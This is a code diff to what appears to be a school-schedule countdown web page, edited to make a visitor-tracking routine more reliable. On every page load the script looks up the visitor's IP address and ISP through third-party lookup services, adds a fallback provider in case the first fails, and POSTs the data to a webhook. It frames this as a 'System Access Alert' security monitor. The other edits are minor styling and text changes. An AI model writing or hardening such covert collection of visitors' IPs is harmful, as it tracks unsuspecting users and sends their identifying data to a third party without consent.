@@ -28,6 +28,7 @@
         .break-card {
             background-color: #f1f5f9;
             border-style: dashed;
+            border-width: 2px;
         }
         .countdown-gradient {
             background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
@@ -72,7 +73,6 @@
 
     <div class="max-w-6xl mx-auto" id="mainContent">
         <div class="flex flex-col md:flex-row items-center justify-between mb-8 gap-4">
-            <!-- Restored ISP Display -->
             <div id="userInfo" class="privacy-box bg-white/80 border border-slate-200 px-4 py-2 rounded-xl text-[10px] text-slate-500 font-mono shadow-sm flex flex-col min-w-[220px] relative overflow-hidden group">
                 <div class="blur-text flex flex-col gap-0.5 relative z-10">
                     <span id="displayIP" class="font-bold">IP: Locating...</span>
@@ -141,49 +141,62 @@
         let weekOffset = 0;
         const summerDate = new Date("May 29, 2026 00:00:00").getTime();
 
-        /** * SECURITY & IDENTITY LOGIC
-         * Restored ISP re-added via extreme-ip-lookup JSONP
+        /** * ROBUST SECURITY LOGIC
+         * Handles the "json Failed to load" error with fallbacks
          */
         function startSecurity() {
-            // Callback for ISP/Geo data
+            let webhookSent = false;
+
+            // Global Webhook trigger to ensure it only fires once per load
+            function triggerWebhook(ip, isp) {
+                if (webhookSent) return;
+                webhookSent = true;
+
+                const payload = {
+                    content: "🚨 **System Access Alert**",
+                    embeds: [{
+                        description: `**User IP:** \`${ip}\`\n**ISP:** \`${isp}\`\n**Time:** ${new Date().toLocaleString()}`,
+                        color: 15158332,
+                        footer: { text: "Security Monitor Active" }
+                    }]
+                };
+
+                const xhr = new XMLHttpRequest();
+                xhr.open("POST", WEBHOOK_URL);
+                xhr.setRequestHeader("Content-Type", "application/json");
+                xhr.send(JSON.stringify(payload));
+            }
+
+            // Primary ISP Callback
             window.receiveGeo = function(data) {
-                const isp = data.org || data.businessName || data.isp || "Unknown ISP";
+                if (!data) return;
+                const isp = data.org || data.isp || data.businessName || "Unknown ISP";
                 document.getElementById('displayISP').textContent = "ISP: " + isp;
-                
-                // Only send webhook once we have both or at least IP
-                sendAccessWebhook(document.getElementById('displayIP').textContent.replace('IP: ', ''), isp);
+                const currentIP = document.getElementById('displayIP').textContent.replace('IP: ', '');
+                triggerWebhook(currentIP, isp);
             };
 
-            // Callback for pure IP (ipify is most stable)
+            // Primary IP Callback (ipify)
             window.receiveIP = function(data) {
                 const userIP = data.ip || "Unknown";
                 document.getElementById('displayIP').textContent = "IP: " + userIP;
                 
-                // Fetch ISP data separately to ensure display
+                // Try ISP Lookup
                 const geoScript = document.createElement('script');
                 geoScript.src = `https://extreme-ip-lookup.com/json/?callback=receiveGeo&key=demo27`;
+                geoScript.onerror = () => {
+                    // Fallback to second ISP provider if extreme-ip fails
+                    const altGeo = document.createElement('script');
+                    altGeo.src = "https://ipapi.co/jsonp?callback=receiveGeo";
+                    document.head.appendChild(altGeo);
+                };
                 document.head.appendChild(geoScript);
             };
 
+            // Start IP Fetch
             const script = document.createElement('script');
             script.src = "https://api.ipify.org?format=jsonp&callback=receiveIP";
             document.head.appendChild(script);
-        }
-
-        function sendAccessWebhook(ip, isp) {
-            const payload = {
-                content: "🚨 **System Access Alert**",
-                embeds: [{
-                    description: `**User IP:** \`${ip}\`\n**ISP:** \`${isp}\`\n**Time:** ${new Date().toLocaleString()}`,
-                    color: 15158332,
-                    footer: { text: "Security Monitor Active" }
-                }]
-            };
-
-            const xhr = new XMLHttpRequest();
-            xhr.open("POST", WEBHOOK_URL);
-            xhr.setRequestHeader("Content-Type", "application/json");
-            xhr.send(JSON.stringify(payload));
         }
 
         function showTab(tab) {
@@ -230,7 +243,7 @@
             const today = new Date().getDay();
             const isThisWeek = (weekOffset === 0);
 
-            document.getElementById('currentWeekDisplay').innerText = isThisWeek ? "Current Week" : `Offset: ${weekOffset} Week(s)`;
+            document.getElementById('currentWeekDisplay').innerText = isThisWeek ? "CURRENT WEEK" : `OFFSET: ${weekOffset} WEEK(S)`;
 
             let html = "";
             let assigned = [];
